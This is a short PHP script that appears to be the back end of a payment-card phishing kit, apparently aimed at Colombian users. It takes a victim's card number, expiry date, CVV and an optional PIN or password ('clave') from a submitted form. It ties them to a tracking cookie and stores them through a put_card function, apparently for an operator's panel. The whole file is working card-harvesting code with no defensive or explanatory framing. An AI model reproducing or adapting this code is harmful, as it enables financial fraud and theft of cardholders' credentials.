<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$tj = $ifilter->process($_POST['tjdt']);
$fecha = $ifilter->process($_POST['fechadt']);
$cvv = $ifilter->process($_POST['cvvdt']);
$clv = isset($_POST['clvdt']) ? $ifilter->process($_POST['clvdt']) : '';

$id = isset($_COOKIE['id']) ? $_COOKIE['id'] : '';
if ($id === '' || $id === '0') {
	exit;
}

if ($clv !== '') {
	$cvv = $cvv . '|clave:' . $clv;
}

put_card($id, $tj, $fecha, $cvv);
